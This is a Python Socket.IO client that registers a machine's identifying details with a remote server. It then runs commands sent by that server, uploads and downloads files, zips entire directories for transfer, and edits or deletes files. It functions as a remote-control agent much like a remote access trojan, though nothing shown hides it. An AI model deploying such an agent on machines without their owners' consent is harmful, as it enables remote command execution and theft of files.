import socketio
from auth import get_client_key
from command_handler import run_command
from utils.system_info import get_hostname, get_hwid, get_ip, get_os, get_username
from config import WEBSOCKET_URL 
import sys
import os
import zipfile
import io
import shutil
import time
import base64
from send2trash import send2trash 

sio = socketio.Client()

@sio.event
def connect():
    print('Connection established')
    register_client()

@sio.event
def disconnect():
    print('Disconnected from server')

@sio.event
def registrationFailed(data):
    print(f"Registration failed: {data['message']}")
    sio.disconnect()
    sys.exit(1)  

def connect_to_server():
    max_retries = 5
    retry_delay = 5
    
    for attempt in range(max_retries):
        print(f"Connection attempt {attempt + 1}/{max_retries}...")
        try:
            sio.connect(WEBSOCKET_URL)
            sio.wait()
            return
        except Exception as e:
            print(f"Connection failed!")
            print(f"Retrying in {retry_delay} seconds...")
            
        if attempt < max_retries - 1:
            time.sleep(retry_delay)
        else:
            print("Max retries exceeded. Exiting...")
            sys.exit(1)
        

def register_client():
    client_info = {
        'hwid': get_hwid(),
        'ip': get_ip(),
        'os': get_os(),
        'hostname': get_hostname(),
        'username': get_username(),
        'online': True,
        'clientKey': get_client_key()
    }
    sio.emit("register", client_info)

@sio.on('destroy')
def destroy_connection():
    sio.disconnect()
    sys.exit(0)

@sio.on('sendCommand')
def handle_command(command):
    response = run_command(command)
    sio.emit("commandResponse", response)

@sio.on('receiveFile')
def receive_File(data):
    try:
        if 'filename' in data and 'fileBuffer' in data:
            filename = data['filename']
            filebuffer = data['fileBuffer']
            destination = data['destination']

            if not os.path.exists(destination):
                sio.emit("receiveFileResponse", {"status": False, "filename": filename, "message": "Destination does not exist"})
                return

            file_path = os.path.join(destination, filename)

            with open(file_path, "wb") as f:
                f.write(filebuffer)

            sio.emit("receiveFileResponse", {"status": True, "filename": filename, "message": f"File {filename} received successfully"})
        else:
            sio.emit("receiveFileResponse", {"status": False, "filename": filename, "message": "Expected keys 'filename' and 'fileBuffer' not found in the received data."})
    except Exception as e:
        sio.emit("receiveFileResponse", {"status": False, "filename": filename, "message": "There was an error while receiving the file"})

@sio.on('requestFile')
def send_file(data):
    try:
        filepath = data['filePath']
        filename = data['filename']

        if not filepath or not filename:
            sio.emit("requestFileResponse", {"status": False, "filename": filename})
            return

        if filename == "*":
            zip_buffer = io.BytesIO()

            with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, _, files in os.walk(filepath):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, filepath)
                        zipf.write(file_path, arcname)

            zip_buffer.seek(0)

            sio.emit("requestFileResponse", {
                "status": True,
                "filename": "files.zip",
                "fileBuffer": zip_buffer.getvalue()
            })

        else:
            full_file_path = os.path.join(filepath, filename)
            if os.path.exists(full_file_path):
                with open(full_file_path, "rb") as f:
                    filebuffer = f.read()
                    sio.emit("requestFileResponse", {
                        "status": True,
                        "filename": filename,
                        "fileBuffer": filebuffer
                    })
            else:
                sio.emit("requestFileResponse", {"status": False, "filename": filename})

    except Exception as e:
        sio.emit("requestFileResponse", {"status": False, "filename": filename})

@sio.on("createFile")
def handle_create_file(data):
    file_path = data.get("filePath")
    content = data.get("content")
    type = data.get("type")

    if type != "file" and type != "folder":
        sio.emit("createFileResponse", {"status": False, "message": "Invalid file type"})
        return
    
    if os.path.exists(file_path):
        sio.emit("createFileResponse", {"status": False, "message": "File/Folder already exists"})
        return
    
    if type == "folder":
        try:
            os.makedirs(file_path)
            sio.emit("createFileResponse", {"status": True})
        except Exception as e:
            sio.emit("createFileResponse", {"status": False})
        return

    try:
        with open(file_path, "w", encoding="utf-8") as file:
            file.write(content)
        sio.emit("createFileResponse", {"status": True})
    except Exception as e:
        sio.emit("createFileResponse", {"status": False})

@sio.on("readFile")
def handle_read_file(data):
    file_path = data.get("filePath")
    
    if not os.path.exists(file_path):
        sio.emit("readFileResponse", {"status": False})
        return
    
    try:
        with open(file_path, "rb") as file:
            content = file.read()
            content_base64 = base64.b64encode(content).decode('utf-8')
            sio.emit("readFileResponse", {"status": True, "content": content_base64})
    except Exception as e:
        sio.emit("readFileResponse", {"status": False})

@sio.on("updateFile")
def handle_update_file(data):
    file_path = data.get("filePath")
    content = data.get("content")
    
    try:
        with open(file_path, "w", encoding="utf-8") as file:
            file.write(content)
        sio.emit("updateFileResponse", {"status": True})
    except Exception as e:
        sio.emit("updateFileResponse", {"status": False})

@sio.on("deleteFile")
def handle_delete_file(data):
    file_path = data.get("filePath")
    
    print(f"Received file path: {file_path}")
    
    try:
        if file_path.startswith("\\\\?\\"):
            file_path = file_path[4:]
            print(f"Normalized file path (after removing '\\\\?\\'): {file_path}")
        
        file_path = os.path.abspath(file_path)
        print(f"Absolute file path: {file_path}")

        if os.path.exists(file_path):
            print(f"File/Folder exists: {file_path}")
            
            if os.path.isdir(file_path):
                print(f"Moving directory to trash: {file_path}")
                send2trash(file_path)
            else:
                print(f"Moving file to trash: {file_path}")
                send2trash(file_path)
            
            print("File/Folder successfully moved to trash.")
            sio.emit("deleteFileResponse", {"status": True})
        else:
            print(f"File/Folder not found: {file_path}") 
            sio.emit("deleteFileResponse", {"status": False, "message": "File/Folder not found"})
    except Exception as e:
        print(f"Error occurred: {e}")
        sio.emit("deleteFileResponse", {"status": False, "message": str(e)})

@sio.on("getFileTree")
def handle_get_file_tree(data):
    path = data.get("path")
    
    if not os.path.exists(path):
        sio.emit("getFileTreeResponse", {"status": False, "message": "Path does not exist"})
        return
    
    try:
        file_tree = []
        for item in os.listdir(path):
            item_path = os.path.join(path, item)
            if os.path.isdir(item_path):
                file_tree.append({"name": item, "type": "folder"})
            else:
                if item != "desktop.ini":
                    file_tree.append({"name": item, "type": "file"})
        
        sio.emit("getFileTreeResponse", {"status": True, "fileTree": file_tree})
    except Exception as e:
        sio.emit("getFileTreeResponse", {"status": False, "message": str(e)})



@sio.on('restart')
def restart_client():
    print("Restarting client...")
    sio.disconnect()
    os.execl(sys.executable, sys.executable, *sys.argv)
